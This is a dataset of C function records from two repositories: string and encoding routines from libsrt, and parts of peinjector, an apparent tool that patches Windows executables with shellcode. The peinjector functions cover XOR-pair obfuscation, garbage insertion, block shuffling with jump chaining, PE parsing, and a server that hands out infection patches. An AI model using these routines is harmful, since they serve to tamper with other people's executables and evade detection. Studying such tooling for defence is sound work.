{"docstring": "/*\n * Unicode character I/O\n */\n", "func_signal": "int ss_getchar(const srt_string *s, size_t *autoinc_off)", "code": "{\n\tint c;\n\tsize_t ss;\n\tconst char *p;\n\tRETURN_IF(!s || !autoinc_off, EOF);\n\tss = ss_size(s);\n\tRETURN_IF(*autoinc_off >= ss, EOF);\n\tc = EOF;\n\tp = ss_get_buffer_r(s);\n\t*autoinc_off += ss_utf8_to_wc(p, *autoinc_off, ss, &c, NULL);\n\treturn c;\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Export\n */\n", "func_signal": "const char *ss_to_c(const srt_string *s)", "code": "{\n\tchar *buf;\n\tsize_t size;\n\tASSERT_RETURN_IF(!s || s->d.f.st_mode == SData_VoidData, \"\");\n\t/*\n\t * BEHAVIOR:\n\t * - References based on C strings are allowed using ss_to_c(),\n\t * however, references using raw data are not, returning an\n\t * empty string instead. In case of requiring accessing to\n\t * the buffer, ss_get_buffer_r(s) could be used instead.\n\t */\n\tRETURN_IF(ss_is_ref(s), ss_is_cref(s) ? ss_get_buffer_r(s) : \"\");\n\t/*\n\t * BEHAVIOR:\n\t * Constness is kept regarding srt_string internal logical state. Said\n\t * that, in order to ensure safe behavior, a 0 terminator is forced\n\t * in case the string was not previously terminated.\n\t * WARNING: be aware of that in the case of storing srt_string\n\t * string on ROM memory or using read-only mmap (int that case\n\t * you'll have to put terminating 0 by yourself after every\n\t * srt_string on ROM or mmap'ed).\n\t */\n\tbuf = (char *)ss_get_buffer_r(s);\n\tsize = ss_size(s);\n\tbuf[size] = 0; /* C string terminator */\n\treturn buf;\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Vector \"at\": element access to given position\n */\n", "func_signal": "const void *sv_at(const srt_vector *v, size_t index)", "code": "{\n\tRETURN_IF(!v, sv_void);\n\treturn (const void *)ptr_to_elem_r(v, index);\n}", "path": "libsrt/src/svector.c", "commit_date": "2020-02-09 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/* BEHAVIOR: slash ('/') is not escaped (intentional) */\n", "func_signal": "size_t senc_esc_json(const uint8_t *s, size_t ss, uint8_t *o, size_t known_sso)", "code": "{\n\tsize_t i, j, sso;\n\tRETURN_IF(!s, 0);\n\tsso = known_sso ? known_sso : senc_esc_json_req_size(s, ss);\n\tRETURN_IF(!o, sso);\n\tRETURN_IF(!ss, 0);\n\ti = ss - 1;\n\tj = sso;\n\tfor (; i != (size_t)-1; i--) {\n\t\tswitch (s[i]) {\n\t\tcase '\\b':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\b\", 2);\n\t\t\tcontinue;\n\t\tcase '\\t':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\t\", 2);\n\t\t\tcontinue;\n\t\tcase '\\n':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\n\", 2);\n\t\t\tcontinue;\n\t\tcase '\\f':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\f\", 2);\n\t\t\tcontinue;\n\t\tcase '\\r':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\r\", 2);\n\t\t\tcontinue;\n\t\tcase '\"':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\\\\"\", 2);\n\t\t\tcontinue;\n\t\tcase '\\\\':\n\t\t\tj -= 2;\n\t\t\tmemcpy(o + j, \"\\\\\\\\\", 2);\n\t\t\tcontinue;\n\t\tdefault:\n\t\t\to[--j] = s[i];\n\t\t\tcontinue;\n\t\t}\n\t}\n\treturn sso;\n}", "path": "libsrt/src/saux/senc.c", "commit_date": "2020-03-01 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/* clang-format off */\n", "func_signal": "size_t s_pk_u64_size(const uint8_t *buf)", "code": "{\n\tint h = *buf;\n\treturn h & D8_LE_ID ? D8_LE_SZ : h & D16_LE_ID ? D16_LE_SZ :\n\t       h & D24_LE_ID ? D24_LE_SZ : h & D32_LE_ID ? D32_LE_SZ :\n\t       h & D40_LE_ID ? D40_LE_SZ : h & D48_LE_ID ? D48_LE_SZ :\n\t       h & D56_LE_ID ? D56_LE_SZ : h & D72_LE_ID ? D72_LE_SZ : 0;\n}", "path": "libsrt/src/saux/scommon.c", "commit_date": "2019-02-23 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Accessors\n */\n", "func_signal": "int ss_at(const srt_string *s, size_t off)", "code": "{\n\tsize_t ss;\n\tRETURN_IF(!s, 0);\n\tss = ss_size(s);\n\treturn off < ss ? ss_get_buffer_r(s)[off] : 0;\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/* Acknowledgements: similar to git's strbuf_grow */\n", "func_signal": "size_t sd_grow(srt_data **d, size_t extra_size, size_t extra_tail_bytes)", "code": "{\n\tsize_t size, new_size;\n\tRETURN_IF(!d, 0);\n\tsize = sd_size(*d);\n\tRETURN_IF(s_size_t_overflow(size, extra_size), 0);\n\tnew_size = sd_reserve(d, size + extra_size, extra_tail_bytes);\n\treturn new_size >= (size + extra_size) ? (new_size - size) : 0;\n}", "path": "libsrt/src/saux/sdata.c", "commit_date": "2019-01-03 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * Base64 encoding/decoding\n */\n", "func_signal": "size_t senc_b64(const uint8_t *s, size_t ss, uint8_t *o)", "code": "{\n\tunsigned si0, si1, si2;\n\tsize_t ssod4, ssd3, tail, i, j, out_size;\n\tRETURN_IF(!o, (ss / 3 + (ss % 3 ? 1 : 0)) * 4);\n\tRETURN_IF(!s, 0);\n\tssod4 = (ss / 3) * 4;\n\tssd3 = ss - (ss % 3);\n\ttail = ss - ssd3;\n\ti = ssd3;\n\tj = ssod4 + (tail ? 4 : 0);\n\tout_size = j;\n\tswitch (tail) {\n\tcase 2:\n\t\tsi0 = s[ssd3];\n\t\tsi1 = s[ssd3 + 1];\n\t\to[j - 4] = b64e[EB64C1(si0)];\n\t\to[j - 3] = b64e[EB64C2(si0, si1)];\n\t\to[j - 2] = b64e[EB64C3(si1, 0)];\n\t\to[j - 1] = '=';\n\t\tj -= 4;\n\t\tbreak;\n\tcase 1:\n\t\tsi0 = s[ssd3];\n\t\to[j - 4] = b64e[EB64C1(si0)];\n\t\to[j - 3] = b64e[EB64C2(si0, 0)];\n\t\to[j - 2] = '=';\n\t\to[j - 1] = '=';\n\t\tj -= 4;\n\t}\n\tfor (; i > 0; i -= 3, j -= 4) {\n\t\tsi0 = s[i - 3];\n\t\tsi1 = s[i - 2];\n\t\tsi2 = s[i - 1];\n\t\to[j - 4] = b64e[EB64C1(si0)];\n\t\to[j - 3] = b64e[EB64C2(si0, si1)];\n\t\to[j - 2] = b64e[EB64C3(si1, si2)];\n\t\to[j - 1] = b64e[EB64C4(si2)];\n\t}\n\treturn out_size;\n}", "path": "libsrt/src/saux/senc.c", "commit_date": "2020-03-01 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/*\n * The conversion runs backwards in order to cover the\n * aliasing case without extra memory allocation nor shift.\n */\n", "func_signal": "static srt_string *aux_toenc(srt_string **s, srt_bool cat,\n\t\t\t     const srt_string *src, srt_enc_f f, srt_enc_f2 f2)", "code": "{\n\tsrt_bool aliasing;\n\tsrt_string *src_aux;\n\tunsigned char *s_out;\n\tconst srt_string *src1;\n\tconst unsigned char *src_buf, *s_in;\n\tsize_t in_size, at, enc_size, out_size;\n\tASSERT_RETURN_IF(!s, ss_void);\n\tif (!src)\n\t\tsrc = ss_void;\n\taliasing = *s == src ? S_TRUE : S_FALSE;\n\tsrc_buf = (const unsigned char *)ss_get_buffer_r(src);\n\tin_size = ss_size(src);\n\tat = (cat && *s) ? ss_size(*s) : 0;\n\tenc_size = f ? f(src_buf, in_size, NULL)\n\t\t     : f2 ? f2(src_buf, in_size, NULL, 0) : 0;\n\tout_size = s_size_t_add(at, enc_size, S_NPOS);\n\tif (enc_size > 0 && ss_reserve(s, out_size) >= out_size) {\n\t\tsrc_aux = NULL;\n\t\tif (aliasing) {\n\t\t\t/*\n\t\t\t * For functions not supporting aliasing, use a\n\t\t\t * copy for the input\n\t\t\t */\n\t\t\tif (f == senc_lz || f == sdec_lz || f == senc_lzh) {\n\t\t\t\tss_cpy(&src_aux, *s);\n\t\t\t\tsrc1 = src_aux;\n\t\t\t} else\n\t\t\t\tsrc1 = *s;\n\t\t} else {\n\t\t\tsrc1 = src;\n\t\t}\n\t\ts_in = (const unsigned char *)ss_get_buffer_r(src1);\n\t\ts_out = (unsigned char *)ss_get_buffer(*s) + at;\n\t\tenc_size = f ? f(s_in, in_size, s_out)\n\t\t\t     : f2(s_in, in_size, s_out, enc_size);\n\t\tif (at == 0) {\n\t\t\tset_unicode_size_cached(*s, S_TRUE);\n\t\t\tset_unicode_size(*s, in_size * 2);\n\t\t} else { /* cat */\n\t\t\tif (is_unicode_size_cached(*s) && at == ss_size(*s))\n\t\t\t\tset_unicode_size(*s, get_unicode_size(*s)\n\t\t\t\t\t\t\t     + in_size * 2);\n\t\t\telse\n\t\t\t\tset_unicode_size_cached(*s, S_FALSE);\n\t\t}\n\t\tout_size = at + enc_size;\n\t\tss_set_size(*s, out_size);\n\t\tif (src_aux)\n\t\t\tss_free(&src_aux);\n\t\tset_unicode_size_cached(*s, S_FALSE);\n\t}\n\treturn ss_check(s);\n}", "path": "libsrt/src/sstring.c", "commit_date": "2020-07-21 00:00:00", "repo_name": "faragon/libsrt", "stars": 540, "license": "bsd-3-clause", "language": "c", "size": 2039}
{"docstring": "/* Build XOR pair for value, 32 bit*/\n", "func_signal": "static inline void __peinfect_obfuscator_build_xor_pair_x86(uint32_t value, uint32_t *p1, uint32_t *p2)", "code": "{\n  uint32_t i;\n  *p1 = rand();\n  for (i = 0; i < 2; ++i) {\n    *p1 <<= 16;\n    *p1 |= rand();\n  }\n  *p2 = value ^ *p1;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Add shellcode entry */\n", "func_signal": "static inline int __peinfector_obfuscator_shellcode_add_entry(SHELLCODE *shellcode, char *code, size_t codesize,\nbool add_garbage)", "code": "{\n  SHELLCODE_ENTRY *entry = NULL;\n\n  /* Add entry */\n  shellcode->entry = realloc(shellcode->entry, (shellcode->entrys + 1) * sizeof(SHELLCODE_ENTRY));\n  if (shellcode->entry == NULL) {\n    return -1;\n  }\n  memset(&shellcode->entry[shellcode->entrys], 0, sizeof(SHELLCODE_ENTRY));\n  entry = (SHELLCODE_ENTRY*) &shellcode->entry[shellcode->entrys];\n\n  /* Set Entry */\n  entry->index = shellcode->entrys;\n  entry->code = malloc(codesize);\n  entry->codesize = codesize;\n  entry->type = TYPE_CMD;\n  entry->target = shellcode->entrys + 1;\n  if (entry->code == NULL) {\n    return -1;\n  }\n  memcpy(entry->code, code, codesize);\n\n  /* Add garbage */\n  if (add_garbage) {\n    entry->garbage = __peinfector_obfuscator_generate_garbage(shellcode, &entry->garbagesize);\n  }\n\n  /* Increase size */\n  shellcode->total_size += entry->garbagesize + entry->codesize;\n\n  /* Increase entry counter*/\n  shellcode->entrys++;\n\n  /* Return entry index */\n  return shellcode->entrys - 1;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Try launch data - server*/\n", "func_signal": "static inline bool __peserver_launch_server(PESERVER *server, size_t sAddr, size_t port, size_t connection_queue,\n    size_t receive_buffersize, __peserver_data_processor *processor, pthread_t *thread_id, int *sock)", "code": "{\n  bool returnVar = false;\n  PESERVER_SERVER_HANDLER *handler = calloc(1, sizeof(PESERVER_SERVER_HANDLER));\n  if (handler == NULL) {\n    return returnVar;\n  }\n\n  /* Configure Handler */\n  handler->port = port;\n  handler->server = server;\n  handler->connection_handler = __peserver_connection_handler_data;\n  handler->connection_processor = processor;\n  handler->launch_ok = false;\n  handler->sAddr = sAddr;\n  handler->receive_buffersize = receive_buffersize;\n  handler->connection_queue = connection_queue;\n  if (sem_init(&handler->signal, 0, 0) != 0) {\n    return returnVar;\n  }\n\n  /* Try create server thread */\n  if (pthread_create(thread_id, NULL, __peserver_server_handler, (void*) handler) < 0) {\n    __peserver_debug(server, 0, \"[INIT] Couldn't launch server thread\\n\");\n    sem_destroy(&handler->signal);\n    return returnVar;\n  }\n\n  /* Wait for confirmation */\n  sem_wait(&handler->signal);\n  sem_destroy(&handler->signal);\n  *sock = handler->sock;\n  returnVar = handler->launch_ok;\n  free(handler);\n\n  /* Detach thread */\n  pthread_detach(*thread_id);\n\n  return returnVar;\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Server Handler */\n", "func_signal": "static void *__peserver_server_handler(void *data)", "code": "{\n  int _true = 1;\n  pthread_t thread_id;\n  int socket_desc, client_sock;\n  size_t c = sizeof(struct sockaddr_in);\n  struct sockaddr_in server, client;\n  PESERVER_CONNECTION_HANDLER *handler;\n\n  /* Get server configuration */\n  PESERVER_SERVER_HANDLER *shandler = (PESERVER_SERVER_HANDLER *) data;\n  /* Load config */\n  PESERVER *peserver = shandler->server;\n  size_t port = shandler->port;\n  void *(*generic_connection_handler)(void *) = shandler->connection_handler;\n  __peserver_data_processor *processor = shandler->connection_processor;\n  size_t receive_buffersize = shandler->receive_buffersize;\n  size_t connection_queue = shandler->connection_queue;\n  size_t sAddr = shandler->sAddr;\n\n  /* Create socket */\n  socket_desc = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);\n  if (socket_desc == -1) {\n    __peserver_debug(peserver, 0, \"[INIT] Create socket failed\\n\");\n    shandler->launch_ok = false;\n    sem_post(&shandler->signal);\n    return NULL;\n  }\n\n  /* Enable reuse of address */\n  setsockopt(socket_desc, SOL_SOCKET, SO_REUSEADDR, (const char*) &_true, sizeof(int));\n\n  /* Prepare the sockaddr_in structure */\n  server.sin_family = AF_INET;\n  server.sin_addr.s_addr = sAddr;\n  server.sin_port = htons(port);\n\n  /* Bind */\n  if (bind(socket_desc, (struct sockaddr *) &server, sizeof(server)) < 0) {\n    __peserver_debug(peserver, socket_desc, \"[INIT] Listen socket failed (Port %d)\\n\", port);\n    shandler->launch_ok = false;\n    sem_post(&shandler->signal);\n    return NULL;\n  }\n\n  /* Listen */\n  if (listen(socket_desc, connection_queue)) {\n    __peserver_debug(peserver, socket_desc, \"[INIT] Bind socket failed (Port %d)\\n\", port);\n    shandler->launch_ok = false;\n    sem_post(&shandler->signal);\n    return NULL;\n  }\n\n  /* Signal everything ok */\n  shandler->launch_ok = true;\n  shandler->sock = socket_desc;\n  sem_post(&shandler->signal);\n\n  /* Wait for incoming connections */\n  while ((client_sock = accept(socket_desc, (struct sockaddr *) &client, (socklen_t*) &c)) > 0) {\n    /* Server is terminating */\n    if (peserver->terminating) {\n      __peserver_debug(peserver, socket_desc, \"[SRV] Handler received termination signal\\n\");\n\n      /* Terminate socket */\n      close(socket_desc);\n\n      /* Signalize termination*/\n      sem_post(&peserver->signal);\n      return NULL;\n    }\n\n    /* build new handler */\n    handler = calloc(1, sizeof(PESERVER_CONNECTION_HANDLER));\n    if (handler == NULL) {\n      __peserver_debug(peserver, client_sock, \"[SRV] Handler allocation error\\n\");\n      continue;\n    }\n\n    /* Configure Handler */\n    handler->sock = client_sock;\n    handler->server = peserver;\n    handler->processor = processor;\n    handler->receive_buffersize = receive_buffersize;\n\n    /* Launch thread */\n    memset(&thread_id, 0, sizeof(pthread_t));\n    if (pthread_create(&thread_id, NULL, generic_connection_handler, (void*) handler) < 0) {\n      __peserver_debug(peserver, client_sock, \"[SRV] Handler launch error\\n\");\n      free(handler);\n      continue;\n    }\n\n    __peserver_debug(peserver, client_sock, \"[SRV] Incoming connection from %d.%d.%d.%d\\n\",\n        (int) (client.sin_addr.s_addr & 0xFF), (int) ((client.sin_addr.s_addr & 0xFF00) >> 8),\n        (int) ((client.sin_addr.s_addr & 0xFF0000) >> 16), (int) ((client.sin_addr.s_addr & 0xFF000000) >> 24));\n  }\n\n  return NULL;\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* get jmp position of entry */\n", "func_signal": "static inline int __peinfector_obfuscator_shellcode_get_jmp_pos(SHELLCODE *shellcode, int entry)", "code": "{\n  size_t pos = 0;\n  size_t i = 0;\n\n  if (entry == -1) {\n    return 0;\n  }\n\n  /* Find position to insert JMP after shuffling */\n  pos = 2;\n  for (i = 0; i < shellcode->entrys; ++i) {\n    pos += (shellcode->entry[i].garbagesize + shellcode->entry[i].codesize + 2);\n    if (shellcode->entry[i].index == entry) {\n      /* Correct position (CALL 5, LOOP 4, all other 2) */\n      pos -= (shellcode->entry[i].type == TYPE_CALL) ? 5 : ((shellcode->entry[i].type == TYPE_LOOP) ? 4 : 2);\n      break;\n    }\n  }\n\n  return pos;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Build XOR pair for value, 64 bit*/\n", "func_signal": "static inline void __peinfect_obfuscator_build_xor_pair_x64(uint64_t value, uint64_t *p1, uint64_t *p2)", "code": "{\n  uint32_t i;\n  *p1 = rand();\n  for (i = 0; i < 4; ++i) {\n    *p1 <<= 16;\n    *p1 |= rand();\n  }\n  *p2 = value ^ *p1;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Random uint32 */\n", "func_signal": "static inline uint32_t __peinfect_obfuscator_random_uint32()", "code": "{\n  uint32_t i, p;\n  p = rand();\n  for (i = 0; i < 2; ++i) {\n    p <<= 16;\n    p |= rand();\n  }\n  return p;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Connection handler for each client */\n", "func_signal": "static void *__peserver_connection_handler_data(void *data)", "code": "{\n  int read_size;\n\n  /* Get the handler */\n  PESERVER_CONNECTION_HANDLER *handler = (PESERVER_CONNECTION_HANDLER *) data;\n  /* Get config */\n  size_t sock = handler->sock;\n  PESERVER *server = handler->server;\n  __peserver_data_processor *processor = handler->processor;\n  size_t receive_buffersize = handler->receive_buffersize;\n  char *receive_buffer = malloc(receive_buffersize);\n  /* Free handler */\n  free(handler);\n\n  /* Couldn't allocate Buffer */\n  if (receive_buffer == NULL) {\n    __peserver_debug(server, sock, \"[SRV] Receive buffer allocation error\\n\");\n    return NULL;\n  }\n\n  /* receive data from client */\n  while ((read_size = recv(sock, receive_buffer, receive_buffersize, 0)) > 0) {\n    /* process data */\n    if (!processor(server, sock, (unsigned char*) receive_buffer, read_size)) {\n      /* close connection if processor signalizes */\n      shutdown(sock, 1);\n      close(sock);\n      break;\n\n    }\n  }\n\n  /* Connection terminated */\n  __peserver_debug(server, sock, \"[SRV] Connection terminated\\n\");\n  return NULL;\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* synchronized debugging */\n", "func_signal": "static inline void __peserver_debug(PESERVER *server, int sock, char *msg, ...)", "code": "{\n# ifdef PESERVER_DEBUG_OUTPUT\n  va_list args;\n  va_start(args, msg);\n  time_t timer;\n  char buffer[29];\n  struct tm* tm_info;\n  time(&timer);\n\n  /* Get time */\n  tm_info = localtime(&timer);\n  strftime(buffer, 29, \"[%Y:%m:%d %H:%M:%S] \", tm_info);\n\n  if (pthread_mutex_lock(&server->debug_mutex)) {\n    return; /* Error locking mutex */\n  }\n  /* print timestamp */\n  printf(\"%s\", buffer);\n  if (sock != 0) {\n    printf(\"[SOCK:%d] \", sock);\n  }\n  /* Print message */\n  vprintf(msg, args);\n  fflush(stdout);\n  pthread_mutex_unlock(&server->debug_mutex);\n# endif\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Shuffles array */\n", "func_signal": "static void __peinfector_obfuscator_shuffle(void *array, size_t n, size_t size)", "code": "{\n  char tmp[size];\n  char *arr = array;\n  size_t stride = size * sizeof(char);\n\n  if (n > 1) {\n    size_t i;\n    for (i = 0; i < n - 1; ++i) {\n      size_t rnd = (size_t) rand();\n      size_t j = i + rnd / (RAND_MAX / (n - i) + 1);\n\n      memcpy(tmp, arr + j * stride, size);\n      memcpy(arr + j * stride, arr + i * stride, size);\n      memcpy(arr + i * stride, tmp, size);\n    }\n  }\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Adds additional data to an pe file structure. Return true on success, false otherwise*/\n", "func_signal": "static inline bool __pefile_add_additional_data(unsigned char *mem, size_t position, size_t size, PEFILE *out)", "code": "{\n  DATA_BLOB_EX *newAdditional = NULL;\n\n  out->additional_count++;\n  newAdditional = realloc(out->additional_data, out->additional_count * sizeof(DATA_BLOB_EX));\n\n  /* Couldn't allocate memory */\n  if (newAdditional == NULL) {\n    return false;\n  }\n  out->additional_data = newAdditional;\n  out->additional_data[out->additional_count - 1].position = position;\n  out->additional_data[out->additional_count - 1].memsize = size;\n  out->additional_data[out->additional_count - 1].mem = malloc(out->additional_data[out->additional_count - 1].memsize);\n\n  /* Couldn't allocate memory */\n  if (out->additional_data[out->additional_count - 1].mem == NULL) {\n    return false;\n  }\n  memcpy(out->additional_data[out->additional_count - 1].mem,\n      mem + out->additional_data[out->additional_count - 1].position,\n      out->additional_data[out->additional_count - 1].memsize);\n\n  return true;\n}", "path": "peinjector/peinjector/libpefile.c", "commit_date": "2015-09-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Process PE Data */\n", "func_signal": "static bool __peserver_process_pe_data(PESERVER *server, int sock, unsigned char *datamem, size_t datamemsize)", "code": "{\n  /* Represents a sentinel node (https://en.wikipedia.org/wiki/Sentinel_node) */\n  uint8_t nothing[PEINFECT_PATCH_SENTINELSIZE] = { 0 };\n  PEINFECT_PATCH patch;\n  unsigned char *mem = NULL;\n  unsigned char **mem_ref = (unsigned char **) &mem;\n  size_t memsize;\n  bool token_ok = true;\n  size_t i = 0;\n\n  /* Server isn't enabled */\n  if (!server->enable_infection) {\n    /* Send sentinel */\n    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);\n    return false;\n  }\n\n  /* Check authentication token size */\n  if (datamemsize < PESERVER_TOKEN_SIZE) {\n    __peserver_debug(server, sock, \"[CRTL] Invalid token size \\n\");\n    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);\n    return false;\n  }\n\n  /* Compare token */\n  /* DON'T USE memcpy() AND DON'T break THE LOOP! (Timing attacks!) */\n  for (i = 0; i < PESERVER_TOKEN_SIZE; ++i) {\n    if (datamem[i] != server->token[i]) {\n      token_ok = false;\n    }\n  }\n\n  /* Check token */\n  if (!token_ok) {\n    __peserver_debug(server, sock, \"[CRTL] Invalid token\\n\");\n    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);\n    return false;\n  }\n\n  /* Process PE data */\n  datamem += PESERVER_TOKEN_SIZE;\n  datamemsize -= PESERVER_TOKEN_SIZE;\n\n  /* Try patch file */\n  if (peinfect_infect_patch(datamem, datamemsize, server->infect, &patch)) {\n    __peserver_debug(server, sock, \"[PE] Valid PE header (%d bytes)\\n\", (uint32_t) datamemsize);\n    /* Serialize data */\n    if (peinfect_patch_serialize(&patch, mem_ref, &memsize)) {\n      __peserver_debug(server, sock, \"[PE] Send patch (%d bytes)\\n\", (uint32_t) memsize);\n      /* Send patch to client */\n      send(sock, (const void*) mem, memsize, 0);\n      /* Free memory */\n      free(mem);\n\n    } else {\n      /* Serialization error */\n      __peserver_debug(server, sock, \"[PE] Error during serialization\\n\");\n      /* Send sentinel */\n      send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);\n\n    }\n    /* Free patch structure */\n    peinfect_free_patch(&patch);\n  } else {\n    /* No valid PE Header*/\n    __peserver_debug(server, sock, \"[PE] No valid PE header (%d bytes)\\n\", (uint32_t) datamemsize);\n    /* Send sentinel */\n    send(sock, (const void*) nothing, PEINFECT_PATCH_SENTINELSIZE, 0);\n\n  }\n\n  /* Close connection */\n  return false;\n}", "path": "peinjector/peinjector/libpeserver.c", "commit_date": "2015-09-16 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
{"docstring": "/* Generates new randomized shellcode */\n", "func_signal": "static inline unsigned char* __peinfector_obfuscator_shellcode_generate(SHELLCODE *shellcode, size_t *size)", "code": "{\n  int i = 0;\n  uint32_t pos = 0;\n  uint32_t jmp_pos = 0;\n  int jmp_delta = 0;\n  unsigned char *shellcode_buf = NULL;\n\n  /* Shuffle entrys */\n  __peinfector_obfuscator_shuffle(shellcode->entry, (shellcode->entrys - (shellcode->fix_last ? 1 : 0)),\n      sizeof(SHELLCODE_ENTRY));\n\n  /* Calculate size */\n  *size = ((shellcode->entrys + 1) * 2) + shellcode->total_size;\n\n  /* Allocate shellcode */\n  shellcode_buf = malloc(*size);\n  if (shellcode_buf == NULL) {\n    return NULL;\n  }\n\n  /* Jump to 0 entry */\n  jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, *size, -1, 0);\n  __peinfector_obfuscator_build_relative_jmp(shellcode_buf, 0, OP_JMP, jmp_delta);\n  pos = 2;\n\n  /* Write shellcode, garbage and jmps  */\n  for (i = 0; i < (int) shellcode->entrys; ++i) {\n    /* Write payload data*/\n    /* Write garbage */\n    if (shellcode->entry[i].garbage != NULL) {\n      memcpy(shellcode_buf + pos, shellcode->entry[i].garbage, shellcode->entry[i].garbagesize);\n    }\n    pos += shellcode->entry[i].garbagesize;\n\n    /* Write shellcode data */\n    if (shellcode->entry[i].code != NULL) {\n      memcpy(shellcode_buf + pos, shellcode->entry[i].code, shellcode->entry[i].codesize);\n    }\n    pos += shellcode->entry[i].codesize + 2;\n\n    /* Write jmps */\n    /* Position of jmp cmd */\n    jmp_pos = __peinfector_obfuscator_shellcode_get_jmp_pos(shellcode, shellcode->entry[i].index);\n    /* Difference to next entry */\n    jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, *size, shellcode->entry[i].index,\n        shellcode->entry[i].target);\n\n    switch (shellcode->entry[i].type) {\n      case TYPE_CMD:\n      case TYPE_JMP:\n        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_JMP, jmp_delta);\n        break;\n      case TYPE_LOOP:\n        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_LOOP, jmp_delta - 2);\n        jmp_delta = __peinfector_obfuscator_shellcode_find_delta(shellcode, *size, shellcode->entry[i].index,\n            shellcode->entry[i].index + 1);\n        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos + 2, OP_JMP, jmp_delta);\n        break;\n      case TYPE_CALL:\n        __peinfector_obfuscator_build_relative_jmp(shellcode_buf, jmp_pos, OP_CALL, jmp_delta);\n        break;\n    }\n  }\n\n  /* Return result */\n  return shellcode_buf;\n}", "path": "peinjector/peinjector/libpeinfect_obfuscator.c", "commit_date": "2016-05-11 00:00:00", "repo_name": "JonDoNym/peinjector", "stars": 591, "license": "unlicense", "language": "c", "size": 12953}
